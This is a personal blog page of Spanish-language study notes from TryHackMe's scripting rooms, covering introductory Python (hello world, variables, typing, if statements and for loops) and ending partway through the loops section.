<!DOCTYPE html>
<html lang="en">
<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

  

  <title>0.Scripting for pentesters.</title>

  
  <meta name="author" content="Qv1nTv5">
  

  <meta name="description" content="Compilation of notes of Tryhackme&apos;s scripting rooms.">

  

  

  
  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
  

  

  

  

  


  
    
      
  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">


    
      
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">


    
      
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">


    
  

  
    
      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
    
      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
    
  

  

  
  
  

  

  
  <meta property="og:site_name" content="Home">
  <meta property="og:title" content="0.Scripting for pentesters.">
  <meta property="og:description" content="Compilation of notes of Tryhackme&apos;s scripting rooms.">

  

  
  <meta property="og:type" content="article">
  <meta property="og:article:author" content="Qv1nTv5">
  <meta property="og:article:published_time" content="2022-07-10T00:00:00-04:00">
  <meta property="og:url" content="http://localhost:4000/2022-07-10-0.Scripting_for_pentesters/">
  <link rel="canonical" href="http://localhost:4000/2022-07-10-0.Scripting_for_pentesters/">
  

  
  <meta name="twitter:card" content="summary">
  
  <meta name="twitter:site" content="@Qvintvs1">
  <meta name="twitter:creator" content="@Qvintvs1">

  <meta property="twitter:title" content="0.Scripting for pentesters.">
  <meta property="twitter:description" content="Compilation of notes of Tryhackme&apos;s scripting rooms.">

  

  


  

  

</head>


<body>

  


  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>

  <div class="collapse navbar-collapse" id="main-navbar">
    <ul class="navbar-nav ml-auto">
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                  <a class="dropdown-item" href="/Cpage">C</a>
                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
            </div>
          </li>
        
          <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
                  <a class="dropdown-item" href="/THMpage">Thm</a>
                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
                  <a class="dropdown-item" href="/REDESpage">Net</a>
                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
            </div>
          </li>
        
        <li class="nav-item">
          <a class="nav-link" id="nav-search-link" href="#" title="Search">
            <span id="nav-search-icon" class="fa fa-search"></span>
            <span id="nav-search-text">Search</span>
          </a>
        </li></ul>
  </div>

  

  

</nav>



<div id="beautifuljekyll-search-overlay">

  <div id="nav-search-exit" title="Exit search">✕</div>
  <input type="text" id="nav-search-input" placeholder="Search">
  <ul id="search-results-container"></ul>
  
  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
  <script>
    var searchjson = '[ \
       \
        { \
          "title"    : "2. Constants and Literals in C.", \
          "category" : "C", \
          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
          "date"     : "December 10, 2024" \
        }, \
       \
        { \
          "title"    : "1. Basics of C", \
          "category" : "C", \
          "url"      : "/2024-12-02-1.BasicsOfC/", \
          "date"     : "December  2, 2024" \
        }, \
       \
        { \
          "title"    : "Gramáticas en Dharma", \
          "category" : "DHA", \
          "url"      : "/2024-09-24-Dharma_Tutorial/", \
          "date"     : "September 24, 2024" \
        }, \
       \
        { \
          "title"    : "Gramáticas en Dharma", \
          "category" : "fuzz", \
          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
          "date"     : "March 22, 2024" \
        }, \
       \
        { \
          "title"    : "Mi experiencia con el OSCP", \
          "category" : "pen", \
          "url"      : "/2023-11-19-PEN200_Experience/", \
          "date"     : "November 19, 2023" \
        }, \
       \
        { \
          "title"    : "Client Side", \
          "category" : "pen", \
          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
          "date"     : "November 17, 2023" \
        }, \
       \
        { \
          "title"    : "Deep Packet Tunneling", \
          "category" : "pen", \
          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
          "date"     : "November 16, 2023" \
        }, \
       \
        { \
          "title"    : "Report", \
          "category" : "pen", \
          "url"      : "/2023-11-15-15.Making_Reports/", \
          "date"     : "November 15, 2023" \
        }, \
       \
        { \
          "title"    : "Metasploit", \
          "category" : "pen", \
          "url"      : "/2023-11-14-14.Metasploit/", \
          "date"     : "November 14, 2023" \
        }, \
       \
        { \
          "title"    : "Password Attacks", \
          "category" : "pen", \
          "url"      : "/2023-11-13-13.Password_Attacks/", \
          "date"     : "November 13, 2023" \
        }, \
       \
        { \
          "title"    : "Active Directory Attacks", \
          "category" : "pen", \
          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
          "date"     : "November 12, 2023" \
        }, \
       \
        { \
          "title"    : "Port Forwarding", \
          "category" : "pen", \
          "url"      : "/2023-11-11-11.Port_Forwarding/", \
          "date"     : "November 11, 2023" \
        }, \
       \
        { \
          "title"    : "Privilege Escalation", \
          "category" : "pen", \
          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
          "date"     : "November 10, 2023" \
        }, \
       \
        { \
          "title"    : "File Transfers", \
          "category" : "pen", \
          "url"      : "/2023-11-09-9.File_Tranfers/", \
          "date"     : "November  9, 2023" \
        }, \
       \
        { \
          "title"    : "Buffer Overflows", \
          "category" : "pen", \
          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
          "date"     : "November  8, 2023" \
        }, \
       \
        { \
          "title"    : "Vulnerability Scanning.", \
          "category" : "pen", \
          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
          "date"     : "November  7, 2023" \
        }, \
       \
        { \
          "title"    : "Information Gathering", \
          "category" : "pen", \
          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
          "date"     : "November  6, 2023" \
        }, \
       \
        { \
          "title"    : "Windows", \
          "category" : "pen", \
          "url"      : "/2023-11-05-5.Windows/", \
          "date"     : "November  5, 2023" \
        }, \
       \
        { \
          "title"    : "Networking", \
          "category" : "pen", \
          "url"      : "/2023-11-04-4.Networking/", \
          "date"     : "November  4, 2023" \
        }, \
       \
        { \
          "title"    : "Scripting", \
          "category" : "pen", \
          "url"      : "/2023-11-03-3.Scripting/", \
          "date"     : "November  3, 2023" \
        }, \
       \
        { \
          "title"    : "Practical Tools", \
          "category" : "pen", \
          "url"      : "/2023-11-02-2.PracticalTools/", \
          "date"     : "November  2, 2023" \
        }, \
       \
        { \
          "title"    : "Linux", \
          "category" : "pen", \
          "url"      : "/2023-11-01-1.Linux/", \
          "date"     : "November  1, 2023" \
        }, \
       \
        { \
          "title"    : "Easy", \
          "category" : "hack", \
          "url"      : "/2022-12-01-Easy/", \
          "date"     : "December  1, 2022" \
        }, \
       \
        { \
          "title"    : "Git Basics", \
          "category" : "", \
          "url"      : "/2022-11-17-GitBasics/", \
          "date"     : "November 17, 2022" \
        }, \
       \
        { \
          "title"    : "Tier I", \
          "category" : "hack", \
          "url"      : "/2022-11-10-Tier_1/", \
          "date"     : "November 10, 2022" \
        }, \
       \
        { \
          "title"    : "Tier 0", \
          "category" : "hack", \
          "url"      : "/2022-11-09-Tier_0/", \
          "date"     : "November  9, 2022" \
        }, \
       \
        { \
          "title"    : "7.BufferOverflow.", \
          "category" : "thm", \
          "url"      : "/2022-11-02-7.BufferOverflow/", \
          "date"     : "November  2, 2022" \
        }, \
       \
        { \
          "title"    : "6.Offensive Pentesting", \
          "category" : "thm", \
          "url"      : "/2022-11-01-6.OffensivePentesting/", \
          "date"     : "November  1, 2022" \
        }, \
       \
        { \
          "title"    : "5.RedTeam", \
          "category" : "thm", \
          "url"      : "/2022-10-30-5.RedTeam/", \
          "date"     : "October 30, 2022" \
        }, \
       \
        { \
          "title"    : "4.Windows", \
          "category" : "thm", \
          "url"      : "/2022-10-22-4.Windows/", \
          "date"     : "October 22, 2022" \
        }, \
       \
        { \
          "title"    : "3.Junior Penetrationtester path", \
          "category" : "thm", \
          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
          "date"     : "September  2, 2022" \
        }, \
       \
        { \
          "title"    : "2.Complete Begginer path.", \
          "category" : "thm", \
          "url"      : "/2022-08-07-2.CompleteBegginer/", \
          "date"     : "August  7, 2022" \
        }, \
       \
        { \
          "title"    : "1.Pre-Security path.", \
          "category" : "thm", \
          "url"      : "/2022-07-11-1Pre-Security/", \
          "date"     : "July 11, 2022" \
        }, \
       \
        { \
          "title"    : "0.Scripting for pentesters.", \
          "category" : "thm", \
          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
          "date"     : "July 10, 2022" \
        }, \
       \
        { \
          "title"    : "Burp Certified Practitioner Practice Exam.", \
          "category" : "burp", \
          "url"      : "/2022-03-30-PracticeExam/", \
          "date"     : "March 30, 2022" \
        }, \
       \
        { \
          "title"    : "22. OAuth Authentication.", \
          "category" : "burp", \
          "url"      : "/2022-03-27-22.OAuth_authentication/", \
          "date"     : "March 27, 2022" \
        }, \
       \
        { \
          "title"    : "21. HTTP Request Smuggling.", \
          "category" : "burp", \
          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
          "date"     : "March 26, 2022" \
        }, \
       \
        { \
          "title"    : "20. HTTP Host Header Attacks.", \
          "category" : "burp", \
          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
          "date"     : "March 25, 2022" \
        }, \
       \
        { \
          "title"    : "19. Web Cache Poisoning.", \
          "category" : "burp", \
          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
          "date"     : "March 24, 2022" \
        }, \
       \
        { \
          "title"    : "18. Server-Side Template Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
          "date"     : "March 23, 2022" \
        }, \
       \
        { \
          "title"    : "17. Insecure Deserialization.", \
          "category" : "burp", \
          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
          "date"     : "March 22, 2022" \
        }, \
       \
        { \
          "title"    : "16. WebSockets.", \
          "category" : "burp", \
          "url"      : "/2022-03-21-16.WebSockets/", \
          "date"     : "March 21, 2022" \
        }, \
       \
        { \
          "title"    : "15.DOM-based XSS vulnerabilities.", \
          "category" : "burp", \
          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
          "date"     : "March 20, 2022" \
        }, \
       \
        { \
          "title"    : "14. Clickjacking.", \
          "category" : "burp", \
          "url"      : "/2022-03-19-14.Clickjacking/", \
          "date"     : "March 19, 2022" \
        }, \
       \
        { \
          "title"    : "13. Cross-Origin Resource Sharing.", \
          "category" : "burp", \
          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
          "date"     : "March 18, 2022" \
        }, \
       \
        { \
          "title"    : "12. Cross-Site Request Forgery.", \
          "category" : "burp", \
          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
          "date"     : "March 17, 2022" \
        }, \
       \
        { \
          "title"    : "11. Cross-Site Scripting.", \
          "category" : "burp", \
          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
          "date"     : "March 16, 2022" \
        }, \
       \
        { \
          "title"    : "10. XXE Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-15-10.XXE_injection/", \
          "date"     : "March 15, 2022" \
        }, \
       \
        { \
          "title"    : "9. Server-Side Request Forgery.", \
          "category" : "burp", \
          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
          "date"     : "March 14, 2022" \
        }, \
       \
        { \
          "title"    : "8. File Upload.", \
          "category" : "burp", \
          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
          "date"     : "March 13, 2022" \
        }, \
       \
        { \
          "title"    : "7. Access Control.", \
          "category" : "burp", \
          "url"      : "/2022-03-12-7.Access_control/", \
          "date"     : "March 12, 2022" \
        }, \
       \
        { \
          "title"    : "6. Information Disclosure.", \
          "category" : "burp", \
          "url"      : "/2022-03-11-6.Information_disclosure/", \
          "date"     : "March 11, 2022" \
        }, \
       \
        { \
          "title"    : "5. Bussiness Logic Vulnerabilities.", \
          "category" : "burp", \
          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
          "date"     : "March 10, 2022" \
        }, \
       \
        { \
          "title"    : "4. Command Injection.", \
          "category" : "burp", \
          "url"      : "/2022-03-09-4.Command_Injection/", \
          "date"     : "March  9, 2022" \
        }, \
       \
        { \
          "title"    : "3. Directory Traversal.", \
          "category" : "burp", \
          "url"      : "/2022-03-08-3.Directory_Traversal/", \
          "date"     : "March  8, 2022" \
        }, \
       \
        { \
          "title"    : "2. Authentication.", \
          "category" : "burp", \
          "url"      : "/2022-03-07-2.Authentication/", \
          "date"     : "March  7, 2022" \
        }, \
       \
        { \
          "title"    : "1. SQLInjection", \
          "category" : "burp", \
          "url"      : "/2022-03-06-1.SQLInjection/", \
          "date"     : "March  6, 2022" \
        }, \
       \
        { \
          "title"    : "Seguridad Perimetral", \
          "category" : "blueteam", \
          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
          "date"     : "February  9, 2022" \
        }, \
       \
        { \
          "title"    : "Hardening de sistemas", \
          "category" : "blueteam", \
          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
          "date"     : "February  9, 2022" \
        }, \
       \
        { \
          "title"    : "Bandit", \
          "category" : "otw", \
          "url"      : "/2022-02-08-Bandit/", \
          "date"     : "February  8, 2022" \
        }, \
       \
        { \
          "title"    : "Proxy", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Proxys/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Protocolos Relevantes", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Protocolos_Importantes/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Curso Básico Redes", \
          "category" : "redes", \
          "url"      : "/2022-02-07-Precurso_Redes/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "IPs", \
          "category" : "redes", \
          "url"      : "/2022-02-07-IPs/", \
          "date"     : "February  7, 2022" \
        }, \
       \
        { \
          "title"    : "Movimientos Laterales", \
          "category" : "redteam", \
          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
          "date"     : "February  6, 2022" \
        }, \
       \
        { \
          "title"    : "Evasión de Defensas", \
          "category" : "redteam", \
          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
          "date"     : "February  5, 2022" \
        }, \
       \
        { \
          "title"    : "Escalada de privilegios", \
          "category" : "redteam", \
          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
          "date"     : "February  5, 2022" \
        }, \
       \
        { \
          "title"    : "Metasploit", \
          "category" : "redteam", \
          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
          "date"     : "February  4, 2022" \
        }, \
       \
        { \
          "title"    : "Ataques a aplicaciones Android", \
          "category" : "redteam", \
          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
          "date"     : "February  3, 2022" \
        }, \
       \
        { \
          "title"    : "Ataque a aplicaciones web.", \
          "category" : "redteam", \
          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
          "date"     : "February  2, 2022" \
        }, \
       \
        { \
          "title"    : "Ataques a Infraestructuras y Redes", \
          "category" : "redteam", \
          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
          "date"     : "February  1, 2022" \
        }, \
       \
        { \
          "title"    : "Análisis de Objetivos", \
          "category" : "redteam", \
          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
          "date"     : "January 28, 2022" \
        }, \
       \
       \
        { \
          "title"    : "Blueteam Basics", \
          "category" : "page", \
          "url"      : "/BLUETEAMBASICSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "PortSwigger BurpSuite Course", \
          "category" : "page", \
          "url"      : "/BURPSUITEpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "C programming subjects.", \
          "category" : "page", \
          "url"      : "/Cpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Dharma Fuzzer language", \
          "category" : "page", \
          "url"      : "/DHARMApage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Exploiting &amp; Reversing", \
          "category" : "page", \
          "url"      : "/EXPREVpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Fuzzing JavaScript Engine", \
          "category" : "page", \
          "url"      : "/Fuzzpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "HackTheBox", \
          "category" : "page", \
          "url"      : "/HackTheBoxpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "PEN200 notes", \
          "category" : "page", \
          "url"      : "/PEN200page/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Proyectos", \
          "category" : "page", \
          "url"      : "/PROJECTSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Networking Basics", \
          "category" : "page", \
          "url"      : "/REDESpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "RedTeam Basics", \
          "category" : "page", \
          "url"      : "/REDTEAMBASICSpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Retired Machines", \
          "category" : "page", \
          "url"      : "/RetiredMachinespage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "TryHackMe", \
          "category" : "page", \
          "url"      : "/THMpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "About me", \
          "category" : "page", \
          "url"      : "/aboutme/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "THM", \
          "category" : "page", \
          "url"      : "/preOSCPpage/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Tag Index", \
          "category" : "page", \
          "url"      : "/tags/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page2/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page3/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page4/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page5/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page6/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page7/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page8/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page9/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page10/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page11/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page12/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page13/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page14/", \
          "date"     : "January 1, 1970" \
        }, \
       \
        { \
          "title"    : "Germán Sanmillán", \
          "category" : "page", \
          "url"      : "/page15/", \
          "date"     : "January 1, 1970" \
        } \
       \
    ]';
    searchjson = JSON.parse(searchjson);

    var sjs = SimpleJekyllSearch({
      searchInput: document.getElementById('nav-search-input'),
      resultsContainer: document.getElementById('search-results-container'),
      json: searchjson
    });
  </script>
</div>





  <!-- TODO this file has become a mess, refactor it -->







<header class="header-section ">

<div class="intro-header no-img">
  <div class="container-md">
    <div class="row">
      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
        <div class="post-heading">
          <h1>0.Scripting for pentesters.</h1>
          
            
              <h2 class="post-subheading">Compilation of notes of Tryhackme's scripting rooms.</h2>
            
          

          
            <span class="post-meta">Posted on July 10, 2022</span>
            
            
          
        </div>
      </div>
    </div>
  </div>
</div>
</header>





<div class=" container-md ">
  <div class="row">
    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">

      

      

      <article role="main" class="blog-post">
        <h2 id="0-índice">0. Índice.</h2>

<ul>
  <li>1 Python Basics.</li>
  <li>2 Python for Pentesters.</li>
  <li>3 Hacking with Powershell.</li>
  <li>4 Powershell for Pentesters.</li>
</ul>

<p><br /></p>

<h3 id="1-python-basics">1. Python Basics.</h3>

<p><strong>Introduction to Python</strong></p>

<p>En este apartado nos introduciremos al lenguaje de programación Python.</p>

<p>Cubriremos:</p>

<ul>
  <li>Variables</li>
  <li>Loops</li>
  <li>Functions</li>
  <li>Data Structures</li>
  <li>If statements</li>
  <li>Files</li>
</ul>

<p>Antes de comenzar diremos que Python es un lenguaje de programación interpretado orientado a la construcción de scripts (pequeños fragmentos de código). Cuando hablamos de que es un <em>lenguaje interpretado</em> nos referimos a que los scripts de python se ejecutan con la ayuda del intérprete de python.</p>

<p>Por otro lado, C por ejemplo, es un <em>lenguaje compilado</em>. De un código escrito en C es necesario extraer un ejecutable (proceso que se llama compilación) mediante el compilador de C, este ejecutable después se cargará en memoria dándo lugar al efectivo procesamiento del código por orden del usuario.</p>

<p>La diferencia entre un intérprete y un compilador es que un <em>intérprete</em> “interpreta” un programa para el procesador, esto es; transforma una sentencia del código a lenguaje máquina y seguidamente se la pasa al procesador para la ejecutación de dicha sentencia mientras que un <em>compilador</em> pasa todo el código a lenguaje a máquina generando un binario ejecutable que no se ejecuta sin previa orden del usuario (que es el que efectivamente ejecuta dicho binario).</p>

<p>Esto significa que para ejecutar un script de python necesitamos previamente un intérprete de python compatible. Podemos descargar dicho IDE desde <a href="https://www.python.org/downloads/">aquí</a></p>

<p><br /></p>

<p><strong>Hello World</strong></p>

<p>Para comenzar, vamos a crear un programa que despliega algo de texto por pantalla:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># This is an example comment
</span><span class="k">print</span><span class="p">(</span><span class="s">"Hello World"</span><span class="p">)</span>
</code></pre></div></div>

<p>Esto mostrará por pantalla el término “Hello World”.</p>

<p>De aquí podemos extraer fundamentalmente dos cosas:</p>

<ul>
  <li>La primera es que podemos utilizar el statement de <em>print()</em> para mostrar por pantalla un string entrecomillado.</li>
  <li>La segunda es que cualquier cosa que vaya después de un ‘#’ es ignorado por el intérprete.</li>
</ul>

<p><br /></p>

<p><strong>Mathematical Operators</strong></p>

<p>Python puede efectuar operaciones matemáticas mediante el uso de los siguientes términos, enter las más básicas encontramos:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220903182139.png" text-align="center" />
</div>

<p>Pero tambíen tenemos operadores más avanzados como comparadores, fundamentales en bucles (if, while, etc):</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220903182323.png" text-align="center" />
</div>

<p>Por ejemplo:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220903182407.png" text-align="center" />
</div>

<p>Observemos que hemos retirado las comillas.</p>

<p><br /></p>

<p><strong>Variables and Data Types. Tiped languages.</strong></p>

<p>Las variables son contenedores de datos con nombre. En Python funcionan asignando un valor a un nombre con el operador asigandor ‘<em>=</em>’. Por ejemplo:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">food</span> <span class="o">=</span> <span class="s">"ice cream"</span>
<span class="n">money</span> <span class="o">=</span> <span class="mi">2000</span>
</code></pre></div></div>

<p>El valor de las variables pueden cambiarse a lo largo del código:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220903183848.png" text-align="center" />
</div>

<p>De esta forma, y una vez asentada la idea de que una variable es un contenedor de datos pasemos a hablar de qué es un dato.</p>

<p>Un dato es una unidad de información y estos, como la última, pueden ser de diferentes tipos. En lo referente a los datos encontramos dos tipos de lenguajes: los lenguajes tipados; aquellos que distinguen entre tipos de datos y reflejan esta discriminación en las variables y los no tipados; aquellos que no discriminan.</p>

<p>Centrándonos en lo que nos concierne, <em>Python es un lenguaje dinámica y débilmente tipado</em>, esto es; que por un lado distingue entre tipos de datos aunque no nos obligue a declarar tipos de variables (débil) y por otro, el tipo de variable está asociado al valor de dicha variable (dinámico).</p>

<p>De forma que al mismo nombre le podemos asociar distintos tipos de valores a lo largo del código sin mayores complicaciones:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220903185555.png" text-align="center" />
</div>

<p><br /></p>

<p>El valor de las variables se sacan por pantalla pasándo el nombre como argumento a la función print():</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220903190147.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>If. Logical and Boolean Operators.</strong></p>

<p>Un programa es un conjunto de líneas de código, sin embargo, esta estructura procedural no impide que un programa pueda tener divergencias de acción.</p>

<p>El <em>if</em> statement ayuda al usuario a que un programa tome decisiones en función de una condición booleana:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">age</span> <span class="o">&lt;</span> <span class="mi">17</span><span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="s">'You are NOT old enough to drive'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="s">'You are old enough to drive'</span><span class="p">)</span>
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220903202253.png" text-align="center" />
</div>

<p><br /></p>

<ul>
  <li>El término <em>if</em> indica el comienzo de la instrucción, seguida de un conjunto de condiciones.</li>
  <li>La declaración if solo se ejecuta si la condición (o conjunto de condiciones) es verdadera. En nuestro ejemplo, es <em>age &lt; 17</em>; si esa condición es verdadera (la edad es mayor de 17), se ejecuta el código dentro de la instrucción if. Según el ejemplo, si no se cumplen ciertas condiciones, el programa puede ejecutar de forma predeterminada el código que se muestra en la <em>else</em> parte de la instrucción if. </li>
  <li>Los dos puntos <em>:</em> marcan el final de la instrucción if.</li>
  <li>Tenga en cuenta la sangría (ajuste de línea). Cualquier cosa después de los dos puntos que tenga sangría, se considera parte de la instrucción if, que ejecutará el programa.</li>
</ul>

<p>Algunas expresiones booleanos y lógicos que nos pueden ayudar en la construcción de if son los siguientes:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220903230113.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020220903230126.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>Loops</strong></p>

<p>Mientas que el <em>if</em> nos permite hacer que un programa tome un camino u otro en función del contexto. Ahora, los bucles 2022-07-10-0.Scripting_for_pentesters.md o <em>while</em> nos permiten introducir al programa en un número de iteraciones limitadas o hasta que se cumpla una condición respectivamente.</p>

<ul>
  <li><em>for</em>: El for concretamente nos permite tomar una lista de valores y actuar con ellos en una iteración de código para cada valor:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">websites</span> <span class="o">=</span> <span class="p">[</span><span class="s">"facebook.com"</span><span class="p">,</span> <span class="s">"google.com"</span><span class="p">,</span> <span class="s">"amazon.com"</span><span class="p">]</span>
<span class="k">for</span> <span class="n">site</span> <span class="ow">in</span> <span class="n">websites</span><span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="n">site</span><span class="p">)</span>
</code></pre></div></div>

